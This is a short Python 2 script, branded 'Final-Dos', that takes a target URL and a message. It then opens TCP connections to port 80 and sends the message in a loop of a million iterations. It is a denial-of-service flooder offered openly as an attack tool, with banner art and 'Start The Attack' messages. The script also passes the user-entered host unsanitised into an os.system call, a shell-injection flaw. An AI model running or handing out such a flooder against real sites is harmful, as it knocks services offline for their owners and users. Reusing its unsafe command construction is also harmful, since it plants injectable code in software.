## -*- coding: utf-8 -*-
# %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: Decembre 30, 2017 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
# By :                     Lamani Fodil Hani (VEGETA-LFH)      
# Fb :             Lamani Fodil Hani             
# Github :           www.github.com/lamanihani     
# Gmail :           lamanihani1@gmail.com       
import time
import socket
import os
import sys
import string
import random
os.system('clear')
print("\033[94m[✘] \033[97minstalling the \033[91mpackage \033[97m, Please wait :")
os.system('apt-get install espeak')
os.system('clear')
  

rania1 = ("            #do you even \033[91mexist\033[97m ")
rania2 = ('''          #Im \033[92mgood\033[97m at reading \033[93mpeople
          \033[97mMy \033[91msecret\033[97m ? I look for the \033[96mworst\033[97m in them\033[97m''')
rania3 = ("            #'\033[91mlove \033[97mis foreever' \033[97mbullshit\033[97m")
rania4 = ("            #we live in a kingdom of \033[91mbullshit\033[97m")
rania5 = ("            #LEAVE ME \033[91mHERE \033[97m!")
rania6 = ("            #LEAVE ME \033[91mHERE \033[97m!")
def kf_art():
    arts = [rania1, rania2, rania3,rania4,rania5,rania6]
    return random.choice(arts)
os.system('clear')

print("""\033[1;31m  \033[97m
   ___________.__              .__              ________                
   \_   _____/|__| ____ _____  |  |             \______ \   ____  ______
    |    __)  |  |/    \\ __  \ |  |     ______   |    |  \ /  _ \/  ___/
    |     \   |  |   |  \/ __ \|  |__  /_____/   |    `   (  <_> )___ \ 
    \___  /   |__|___|  (____  /____/           /_______  /\____/____  >
        \/            \/     \/                         \/           \/ 
                                                        By : Hani lamani VEGETA-LFH ツ
""")
print(kf_art())
print(" ")
host=raw_input( "\033[94m[?] \033[97mURL\033[91m Target\033[97m :\033[93m " )
message=raw_input( "\033[94m[?]\033[97m Your \033[91mMessage \033[97m:\033[93m  " )
#this for get The ip of the URL (Website)
ip = socket.gethostbyname( host )
print ("\033[94m[✔]\033[97m The \033[91mTarget\033[97m Ip : [\033[92m" + ip + "\033[97m]")
print(" ")
os.system('espeak  Start-The-Attack-to-'+host)
os.system('clear')
print ("\033[94m[✔] \033[97mStart The \033[97mAttack\033[97m :")
print(" ")
def hack():
    vegeta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        vegeta.connect((host, 80))
        vegeta.send( message )
        vegeta.sendto( message, (ip, 80) )
        vegeta.send( message );
    except socket.error, msg:
        print("\033[94m[✘]\033[96m Error , Connection Failed")
    print ("\033[94m [✔]\033[92m Sent \033[97m : \033[91m "+  message)
    vegeta.close()
for i in range(1, 1000000):
    hack()
print ("Done")


        
